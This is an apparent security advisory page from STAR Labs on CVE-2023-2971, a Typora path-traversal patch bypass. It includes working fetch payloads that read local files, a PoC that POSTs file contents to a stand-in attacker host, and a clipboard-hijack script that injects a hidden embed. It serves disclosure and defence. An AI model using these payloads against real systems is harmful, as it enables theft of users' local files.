<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>(CVE-2023-2971) Typora Local File Disclosure (Patch Bypass) | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Summary:    Product Typora     Vendor Typora   Severity Medium   Affected Versions Typora for Windows/Linux &lt; 1.7.0-dev   Tested Versions Typora for Windows 1.6.7, Typora for Linux 1.6.6   CVE Identifier CVE-2023-2971   CVE Description Improper path handling in Typora before 1.7.0-dev on Windows and Linux allows a crafted webpage to access local files and exfiltrate them to remote web servers via &ldquo;typora://app/typemark/&rdquo;.">
<meta name="author" content="Li Jiantao (@CurseRed)">
<link rel="canonical" href="https://starlabs.sg/advisories/23/23-2971/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="(CVE-2023-2971) Typora Local File Disclosure (Patch Bypass)" />
<meta property="og:description" content="Summary:    Product Typora     Vendor Typora   Severity Medium   Affected Versions Typora for Windows/Linux &lt; 1.7.0-dev   Tested Versions Typora for Windows 1.6.7, Typora for Linux 1.6.6   CVE Identifier CVE-2023-2971   CVE Description Improper path handling in Typora before 1.7.0-dev on Windows and Linux allows a crafted webpage to access local files and exfiltrate them to remote web servers via &ldquo;typora://app/typemark/&rdquo;." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/advisories/23/23-2971/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
<meta property="article:published_time" content="2023-08-19T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-08-19T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="(CVE-2023-2971) Typora Local File Disclosure (Patch Bypass)"/>
<meta name="twitter:description" content="Summary:    Product Typora     Vendor Typora   Severity Medium   Affected Versions Typora for Windows/Linux &lt; 1.7.0-dev   Tested Versions Typora for Windows 1.6.7, Typora for Linux 1.6.6   CVE Identifier CVE-2023-2971   CVE Description Improper path handling in Typora before 1.7.0-dev on Windows and Linux allows a crafted webpage to access local files and exfiltrate them to remote web servers via &ldquo;typora://app/typemark/&rdquo;."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Advisories",
      "item": "https://starlabs.sg/advisories/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "(CVE-2023-2971) Typora Local File Disclosure (Patch Bypass)",
      "item": "https://starlabs.sg/advisories/23/23-2971/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "(CVE-2023-2971) Typora Local File Disclosure (Patch Bypass)",
  "name": "(CVE-2023-2971) Typora Local File Disclosure (Patch Bypass)",
  "description": "Summary:    Product Typora     Vendor Typora   Severity Medium   Affected Versions Typora for Windows/Linux \u0026lt; 1.7.0-dev   Tested Versions Typora for Windows 1.6.7, Typora for Linux 1.6.6   CVE Identifier CVE-2023-2971   CVE Description Improper path handling in Typora before 1.7.0-dev on Windows and Linux allows a crafted webpage to access local files and exfiltrate them to remote web servers via \u0026ldquo;typora://app/typemark/\u0026rdquo;.",
  "keywords": [
    
  ],
  "articleBody": "Summary:    Product Typora     Vendor Typora   Severity Medium   Affected Versions Typora for Windows/Linux   Tested Versions Typora for Windows 1.6.7, Typora for Linux 1.6.6   CVE Identifier CVE-2023-2971   CVE Description Improper path handling in Typora before 1.7.0-dev on Windows and Linux allows a crafted webpage to access local files and exfiltrate them to remote web servers via “typora://app/typemark/”. This vulnerability can be exploited if a user opens a malicious markdown file in Typora, or copies text from a malicious webpage and paste it into Typora.   CWE Classification(s) CWE-22 Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)   CAPEC Classification(s) CAPEC-139 Relative Path Traversal    CVSS3.1 Scoring System: Base Score: 6.3 (Medium)\nVector String: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N\n   Metric Value     Attack Vector (AV) Local   Attack Complexity (AC) Low   Privileges Required (PR) None   User Interaction (UI) Required   Scope (S) Changed   Confidentiality (C) High   Integrity (I) None   Availability (A) None    Product Overview: Typora is a popular cross-platform markdown editor that allows users to create and edit markdown files with a real-time preview feature. It supports various formatting options such as headings, bold, italics, and more. Typora also allows users to export their markdown files to different formats such as PDF, HTML, and Word.\nTypora for Windows/Linux is built on Electron, a framework that enables it to run seamlessly on various operating systems. The markdown editor supports HTML tags and embedding external webpages. An attacker can use the vulnerability to access arbitrary local files from a malicious webpage loaded in the markdown editor.\nVulnerability Summary: There is a Local File Disclosure vulnerability in typora://app/ in Typora for Windows/Linux, allowing a crafted webpage to access local files and exfiltrate them to remote web servers. This vulnerability can be exploited if a user opens a malicious markdown file in Typora, or copies text from a malicious webpage and paste it into Typora. This vulnerability is similar to CVE-2023-2316, which was incompletely fixed in Typora version 1.6.5.\nVulnerability Details: In resources/app.asar/atom.js, a custom URL scheme typora:// is registered via electron.protocol.registerFileProtocol API. This URL scheme is designed for loading local resources for the editor itself. Here is the code snippet handling typora:// :\nm.registerFileProtocol(e, function(e, t) { e.url ? t({ path: c.getRealPath(e.url) }) : t({ error: -324 }) }), c.getRealPath = function(e) { try { e = decodeURI(e) } catch (e) {} e = e.substr(13); if (/^userData/i.exec(e)) e = e.replace(/^userData/, c.getPath(\"userData\").replace(/\\\\/g, \"\\\\\\\\\")); else { if (!/^typemark/i.exec(e)) // [1]  return console.warn(\"reject access to path\", e), \"\"; e = e.replace(/^typemark/, t) // [2]  } return /current-theme\\.css$/.exec(e) \u0026\u0026 (e = e.replace(/current-theme\\.css$/, c.setting.curTheme())), e = (e = /preview\\.html/.exec(e) ? e.replace(/\\.html[?#].*$/, \".html\") : e).replace(/[?#][^\\\\\\/]*$/, \"\") } This file protocol handler passes the URL to getRealPath function for some match and replacement. For example, when the main window tries to load typora://app/typemark/window.html, the URL will be converted and loaded from [Typora Installation Absolute Path]/resources/window.html.\nIn CVE-2023-2316, it was discovered that an external webpage loaded in  tag was able to read arbitrary local files by executing the following JavaScript code:\nfetch('typora://app/C:/windows/win.ini').then(r=r.text()).then(r={console.log(r)}) To patch this vulnerability, a sanity check was added in Typora 1.6.5 at [1] to ensure the path starts with the string typemark, eliminating the possiblity of passing an absolute path starting with C:\\\\ or /.\nHowever, it is still possible to read arbitrary files using path traversal in two different ways:\n  Approach 1: Using ..%5C (Windows-only):\nfetch('typora://app/typemark/..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows/win.ini').then(r=r.text()).then(r={console.log(r)})   Approach 2: Passing ../ in URL fragment #:\nfetch('typora://app/typemark#../../../../../../../../Windows/win.ini').then(r=r.text()).then(r={console.log(r)})   Exploit Conditions: This vulnerability can be exploited by convicing the victim to (1) open a malicious markdown file in Typora, or (2) copy text from a malicious webpage and paste it into Typora.\nProof-of-Concept: We have tried our best to make the PoC as portable as possible. The following HTML code is a PoC demonstrating this arbitrary file disclosure vulnerability:\n html lang=\"en\" head meta charset=\"UTF-8\" titleTypora 1.6.7 Local File Disclosure Proof-of-Concepttitle head body pre id=\"log\" style=\"background: #eee; width: 100%;\"pre script const log = t = { document.getElementById(\"log\").textContent += t + '\\r\\n'; fetch('//example.localtest.me/send-file-to-attacker-server', {mode: 'no-cors', body: t, method: 'POST'}) } log('location.origin: ' + location.origin) log('navigator.platform: ' + navigator.platform) log(' ') if(navigator.platform === 'Win32'){ log('Content of your C:\\\\Windows\\\\win.ini:') fetch('typora://app/typemark/%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows/win.ini').then(r=r.text()).then(r={log(r)}) } else { log('Content of your /etc/passwd:') fetch('typora://app/typemark#/../../../../../../../../etc/passwd').then(r=r.text()).then(r={log(r)}) } script body html Save the above HTML file as poc1.html and serve it on a webserver, then append this line to any markdown file in Typora: . Once the PoC is loaded in the  tag, it will:\n Try to read C:/Windows/win.ini on Windows, or /etc/passwd on Linux, Show the content of the file in the webpage, Send the file to external URL on example.localtest.me (this domain resolves to 127.0.0.1 for demonstration purposes only).  Attack Scenario: Scenario 1: Open a malicious markdown file An attacker can inject an embed tag in a markdown file and convince the victim to open it in Typora to trigger the payload.\nWe have attached poc/typora-1.6.7-local-file-disclosure.md with this report for demonstration. It loads poc1.html from https://o.cal1.cn/cab3e723540d9948-typora-167-poc/local-file-disclosure.html. Open the file in affected version of Typora to verify this vulnerability.\nScenario 2: Copy and paste from a webpage An attacker can craft a malicious webpage and hook on the copy event with the following code:\nscript document.addEventListener('copy',e={ e.preventDefault(); let payload = atob('JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJodHRwczovL28uY2FsMS5jbi9jYWIzZTcyMzU0MGQ5OTQ4LXR5cG9yYS0xNjctcG9jL2xvY2FsLWZpbGUtZGlzY2xvc3VyZS5odG1sIj4mI3gwZDsmI3gwZDs='); e.clipboardData.setData('text/markhtml', `\\x20\\x0d\\x0a\\x0d\\x0a` + payload + window.getSelection()); console.log(payload + window.getSelection()) }) script When the victim copies text from this page, the payload is added to the copied content and will be triggered when it is pasted into Typora.\nNote: A live version of copy-and-paste PoC can be found here.\nAdditional Notes:  It is possible for attackers to set custom styles on the  tag to make the exploit less noticeable. For instance, height:0; is used in the Scenario 2 PoC to hide the embedded webpage.  Suggested Mitigations: Prohibit http(s) webpages from accessing typora:// resources.\nFor end users who are using the versions affected by this vulnerability, it is suggested that (1) any untrusted markdown file should not be opened in Typora, and (2) copying text from an untrusted webpage then pasting it into Typora should be avoided.\nDetection Guidance: It is possible to detect the exploitation of this vulnerability by checking the presence of embed tags loading suspicious URLs in markdown files.\nCredits: Li Jiantao (@CurseRed) of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline:  2023-06-07 Vendor Disclosure 2023-06-07 Initial Vendor Contact 2023-07-18 Vendor Patch Release (1.7.0-dev) 2023-08-19 Public Release  ",
  "wordCount" : "1043",
  "inLanguage": "en",
  "datePublished": "2023-08-19T00:00:00Z",
  "dateModified": "2023-08-19T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Li Jiantao (@CurseRed)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/advisories/23/23-2971/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
    <h1 class="post-title">
      (CVE-2023-2971) Typora Local File Disclosure (Patch Bypass)
    </h1>
    <div class="post-meta"><span title='2023-08-19 00:00:00 +0000 UTC'>August 19, 2023</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Li Jiantao (@CurseRed)

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#summary" aria-label="Summary:">Summary:</a></li>
                <li>
                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System:">CVSS3.1 Scoring System:</a></li>
                <li>
                    <a href="#product-overview" aria-label="Product Overview:">Product Overview:</a></li>
                <li>
                    <a href="#vulnerability-summary" aria-label="Vulnerability Summary:">Vulnerability Summary:</a></li>
                <li>
                    <a href="#vulnerability-details" aria-label="Vulnerability Details:">Vulnerability Details:</a></li>
                <li>
                    <a href="#exploit-conditions" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
                <li>
                    <a href="#proof-of-concept" aria-label="Proof-of-Concept:">Proof-of-Concept:</a></li>
                <li>
                    <a href="#attack-scenario" aria-label="Attack Scenario:">Attack Scenario:</a><ul>
                        
                <li>
                    <a href="#scenario-1-open-a-malicious-markdown-file" aria-label="Scenario 1: Open a malicious markdown file">Scenario 1: Open a malicious markdown file</a></li>
                <li>
                    <a href="#scenario-2-copy-and-paste-from-a-webpage" aria-label="Scenario 2: Copy and paste from a webpage">Scenario 2: Copy and paste from a webpage</a></li>
                <li>
                    <a href="#additional-notes" aria-label="Additional Notes:">Additional Notes:</a></li></ul>
                </li>
                <li>
                    <a href="#suggested-mitigations" aria-label="Suggested Mitigations:">Suggested Mitigations:</a></li>
                <li>
                    <a href="#detection-guidance" aria-label="Detection Guidance:">Detection Guidance:</a></li>
                <li>
                    <a href="#credits" aria-label="Credits:">Credits:</a></li>
                <li>
                    <a href="#timeline" aria-label="Timeline:">Timeline:</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="summary">Summary:<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Typora</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Vendor</strong></td>
<td>Typora</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>Medium</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>Typora for Windows/Linux &lt; 1.7.0-dev</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>Typora for Windows 1.6.7, Typora for Linux 1.6.6</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>CVE-2023-2971</td>
</tr>
<tr>
<td><strong>CVE Description</strong></td>
<td>Improper path handling in Typora before 1.7.0-dev on Windows and Linux allows a crafted webpage to access local files and exfiltrate them to remote web servers via &ldquo;typora://app/typemark/&rdquo;. This vulnerability can be exploited if a user opens a malicious markdown file in Typora, or copies text from a malicious webpage and paste it into Typora.</td>
</tr>
<tr>
<td><strong>CWE Classification(s)</strong></td>
<td>CWE-22 Improper Limitation of a Pathname to a Restricted Directory (&lsquo;Path Traversal&rsquo;)</td>
</tr>
<tr>
<td><strong>CAPEC Classification(s)</strong></td>
<td>CAPEC-139 Relative Path Traversal</td>
</tr>
</tbody>
</table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
<p><strong>Base Score:</strong> 6.3 (Medium)<br>
<strong>Vector String:</strong> <code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Local</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>Required</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Changed</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>None</td>
</tr>
</tbody>
</table>
<h2 id="product-overview">Product Overview:<a hidden class="anchor" aria-hidden="true" href="#product-overview">#</a></h2>
<p>Typora is a popular cross-platform markdown editor that allows users to create and edit markdown files with a real-time preview feature. It supports various formatting options such as headings, bold, italics, and more. Typora also allows users to export their markdown files to different formats such as PDF, HTML, and Word.</p>
<p>Typora for Windows/Linux is built on Electron, a framework that enables it to run seamlessly on various operating systems. The markdown editor supports HTML tags and embedding external webpages. An attacker can use the vulnerability to access arbitrary local files from a malicious webpage loaded in the markdown editor.</p>
<h2 id="vulnerability-summary">Vulnerability Summary:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h2>
<p>There is a Local File Disclosure vulnerability in <code>typora://app/</code> in Typora for Windows/Linux, allowing a crafted webpage to access local files and exfiltrate them to remote web servers. This vulnerability can be exploited if a user opens a malicious markdown file in Typora, or copies text from a malicious webpage and paste it into Typora. This vulnerability is similar to CVE-2023-2316, which was incompletely fixed in Typora version 1.6.5.</p>
<h2 id="vulnerability-details">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
<p>In <code>resources/app.asar/atom.js</code>, a custom URL scheme <code>typora://</code> is registered via <code>electron.protocol.registerFileProtocol</code> API. This URL scheme is designed for loading local resources for the editor itself. Here is the code snippet handling <code>typora://</code> :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">registerFileProtocol</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">e</span><span class="p">.</span><span class="nx">url</span> <span class="o">?</span> <span class="nx">t</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="nx">path</span><span class="o">:</span> <span class="nx">c</span><span class="p">.</span><span class="nx">getRealPath</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span> <span class="o">:</span> <span class="nx">t</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="nx">error</span><span class="o">:</span> <span class="o">-</span><span class="mi">324</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">}),</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">c</span><span class="p">.</span><span class="nx">getRealPath</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">e</span> <span class="o">=</span> <span class="nb">decodeURI</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">13</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="sr">/^userData/i</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">e</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nx">e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^userData/</span><span class="p">,</span> <span class="nx">c</span><span class="p">.</span><span class="nx">getPath</span><span class="p">(</span><span class="s2">&#34;userData&#34;</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\\/g</span><span class="p">,</span> <span class="s2">&#34;\\\\&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="sr">/^typemark/i</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">e</span><span class="p">))</span>      <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="s2">&#34;reject access to path&#34;</span><span class="p">,</span> <span class="nx">e</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^typemark/</span><span class="p">,</span> <span class="nx">t</span><span class="p">)</span>       <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sr">/current-theme\.css$/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/current-theme\.css$/</span><span class="p">,</span> <span class="nx">c</span><span class="p">.</span><span class="nx">setting</span><span class="p">.</span><span class="nx">curTheme</span><span class="p">())),</span>
</span></span><span class="line"><span class="cl">    <span class="nx">e</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span> <span class="o">=</span> <span class="sr">/preview\.html/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">?</span> <span class="nx">e</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\.html[?#].*$/</span><span class="p">,</span> <span class="s2">&#34;.html&#34;</span><span class="p">)</span> <span class="o">:</span> <span class="nx">e</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[?#][^\\\/]*$/</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This file protocol handler passes the URL to <code>getRealPath</code> function for some match and replacement. For example, when the main window tries to load <code>typora://app/typemark/window.html</code>, the URL will be converted and loaded from <code>[Typora Installation Absolute Path]/resources/window.html</code>.</p>
<p>In CVE-2023-2316, it was discovered that an external webpage loaded in <code>&lt;embed&gt;</code> tag was able to read arbitrary local files by executing the following JavaScript code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;typora://app/C:/windows/win.ini&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">r</span><span class="p">)})</span>
</span></span></code></pre></div><p>To patch this vulnerability, a sanity check was added in Typora 1.6.5 at <code>[1]</code> to ensure the path starts with the string <code>typemark</code>, eliminating the possiblity of passing an absolute path starting with <code>C:\\</code> or <code>/</code>.</p>
<p>However, it is still possible to read arbitrary files using path traversal in two different ways:</p>
<ul>
<li>
<p>Approach 1: Using <code>..%5C</code> (Windows-only):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;typora://app/typemark/..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows/win.ini&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">r</span><span class="p">)})</span>
</span></span></code></pre></div></li>
<li>
<p>Approach 2: Passing <code>../</code> in URL fragment <code>#</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;typora://app/typemark#../../../../../../../../Windows/win.ini&#39;</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">r</span><span class="p">)})</span>
</span></span></code></pre></div></li>
</ul>
<p><img loading="lazy" src="/advisories/23/images/CVE-2023-2971_01.Typora-for-Windows-1-6-7-Local-File-Disclosure.png" alt=""  />
</p>
<p><img loading="lazy" src="/advisories/23/images/CVE-2023-2971_02.Typora-for-Linux-1-6-6-Local-File-Disclosure-Tested-on-Ubuntu.png" alt=""  />
</p>
<h2 id="exploit-conditions">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h2>
<p>This vulnerability can be exploited by convicing the victim to (1) open a malicious markdown file in Typora, or (2) copy text from a malicious webpage and paste it into Typora.</p>
<h2 id="proof-of-concept">Proof-of-Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
<p>We have tried our best to make the PoC as portable as possible. The following HTML code is a PoC demonstrating this arbitrary file disclosure vulnerability:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Typora 1.6.7 Local File Disclosure Proof-of-Concept<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">pre</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;log&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;background: #eee; width: 100%;&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">log</span> <span class="o">=</span> <span class="nx">t</span> <span class="p">=&gt;</span> <span class="p">{</span>
